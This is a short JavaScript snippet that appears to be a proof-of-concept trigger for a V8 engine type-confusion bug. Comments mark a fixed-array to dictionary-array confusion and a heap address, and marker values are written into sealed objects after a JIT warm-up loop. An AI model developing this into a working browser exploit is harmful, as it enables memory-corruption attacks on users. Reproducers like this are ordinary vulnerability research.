<code>
function f() {
    let o = {foo: 1.1};
    o[5] = 5; //keyed v12 0x8fadaa0bdd9
    Object.seal(o);
    
    let t = {foo: 2.2};
    
    Object.preventExtensions(t);
    Object.seal(t);
    let retarget = {foo: Object}; //store
    t[0] = 0x434343;
    
    o[0] = 0x4242; //fixed_array -> dictonary array type confusion
}

for(let i = 0 ; i < 5000;i++)
	console.log(i);

console.log(f());
</code>
